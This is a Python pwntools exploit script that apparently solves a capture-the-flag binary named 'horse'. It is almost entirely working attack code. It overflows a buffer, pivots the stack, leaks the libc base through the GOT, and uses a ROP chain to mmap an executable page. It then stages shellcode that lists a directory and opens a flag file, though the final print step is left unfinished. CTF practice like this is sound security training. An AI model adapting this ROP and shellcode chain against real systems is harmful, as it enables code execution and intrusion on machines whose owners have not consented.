#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *
from warnings import filterwarnings

# Set up pwntools for the correct architecture
exe = context.binary = ELF('horse_patched')
context.terminal = ['xfce4-terminal', '--title=GDB-Pwn', '--zoom=0', '--geometry=128x50+1100+0', '-e']
libc = exe.libc

filterwarnings("ignore")
context.log_level = 'debug'

def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE: 
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
init-pwndbg
b *main+57
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================


def init():
    global io

    io = start()

def solve():
    offset = 40
    pop_rdi = 0x0000000000400c03 # pop rdi; ret;
    pop_rsi_r15 = 0x0000000000400c01 # pop rsi; pop r15; ret; 
    pop_rsp_junk = 0x0000000000400bfd # pop rsp; pop r13; pop r14; pop r15; ret; 
    ret = 0x00000000004005a8 # ret; 

    pivot = 0x602000

    stack_pivot = flat({ # stack pivot to .data
        offset: [
            pop_rdi,
            0x0,
            pop_rsi_r15,
            pivot,
            0x0,
            exe.plt['read'],
            pop_rsp_junk,
            pivot
        ]
    })

    io.send(stack_pivot)

    pivot2 = 0x3ff000+0x900 

    leak_libc = flat( # leak libc
        [
            ret,
            ret,
            ret,
            pop_rdi,
            0x1,
            pop_rsi_r15,
            exe.got['read'],
            0x0,
            exe.plt['write'],
            pop_rdi,
            0x0,
            pop_rsi_r15,
            pivot2,
            0x0,
            exe.plt['read'],
            pop_rsp_junk,
            pivot2,
            0x0,
            0x0,
            0x0
        ]
    )

    io.send(leak_libc)
    io.recv(0x102)
    leak = u64(io.recv(6).ljust(8, b'\x00'))
    libc.address = leak - libc.sym['read']
    ld_base = libc.address + 0x247000
    info("libc base: %#x", libc.address)
    info("ld base: %#x", ld_base)
    info("read: %#x", libc.sym['read'])
    io.clean()


    pop_rax = libc.address + 0x4a550 # pop rax ; ret
    pop_rdi = libc.address + 0x26b72 # pop rdi ; ret
    pop_rsi = libc.address + 0x27529 # pop rsi ; ret
    pop_rdx = ld_base + 0x11b3 # pop rdx; pop rbx; ret
    pop_rcx = libc.address + 0x9f822 # pop rcx ; ret

    modify_r8 = libc.address + 0x0122937 # mov r8d, eax ; mov eax, r8d ; ret
    modify_r9 = libc.address + 0xc9ccf # xor r9d, r9d ; mov eax, r9d ; ret
    modify_r10 = libc.address + 0x7b0cb # mov r10, rdx ; jmp rax
    syscall = ld_base + 0x1f249 # syscall; ret;

    sc_addr = 0xcafebabe
    call_rsi = libc.address + 0x28c1b # mov rdi, rbx ; call rsi
    # mmap(0xcafebabe, 0x1000, 0x7, 0x22, -1, 0)

    make_exec = flat(
        [
            ret,
            ret,
            ret,
            pop_rdi,
            0x1,
            pop_rax,
            exe.plt['write'],
            pop_rdx,
            0x22,
            0x0,
            modify_r10,
            pop_rax,
            -1,
            modify_r8,
            modify_r9,
            pop_rdi,
            sc_addr,
            pop_rsi,
            0x1000,
            pop_rdx,
            0x7,
            0x0,
            pop_rcx,
            0x22,
            pop_rax,
            0x9,
            syscall,
            pop_rdi,
            0x0,
            pop_rsi,
            sc_addr,
            pop_rdx,
            0x256,
            0x0,
            exe.plt['read'],
            call_rsi
        ]
    )

    io.send(make_exec)
    io.clean()

    dir_addr = sc_addr+0x100
    dir_files = sc_addr+0x200
    file_addr = sc_addr+0x150

    sc = asm(f"""
        write_file_name:
             xor rax, rax
             xor rdi, rdi
             mov rsi, {dir_addr}
             mov rdx, 12
             syscall

        open_dir:
             xor rax, rax
             add rax, 0x2
             mov rdi, rsi
             mov rsi, 0x1000
             mov rdx, 0x400
             syscall
        
        get_files_in_dir:
             mov rdi, rax
             mov rax, 0xd9
             mov rsi, {dir_files}
             mov rdx, 0x1000
             xor r10, r10
             xor r8, r8
             xor r9, r9
             syscall

        write_files_in_dir:
             xor rax, rax
             add rax, 0x2
             mov rdi, 0x1
             mov rsi, {dir_addr}
             mov rdx, 0x400
             mov r8, {exe.plt['write']}
             call r8
            
        print_flag:
            xor rax, rax
            xor rdi, rdi
            mov rsi, {file_addr}
            mov rdx, 58
            syscall

            mov rax, 0x2
            mov rdi, rsi
            mov rsi, 0x0
            xor rdx, rdx
            syscall

            mov rdi, rax
            xor rax, rax
            mov rsi, 0x3ff800
            mov rdx, 60
    """)


    io.send(sc)
    io.send("/tmp/srv/app")
    r = io.recv(timeout=2).replace(b'\x00', b'')
    print(r)

    path = "/tmp/srv/app/flag-cd9fad2d-61d5-4e6d-bb8e-b66d7a90dc4e.txt"
    io.send(path)
    

    io.interactive()

def main():
    
    init()
    solve()

if __name__ == '__main__':
    main()

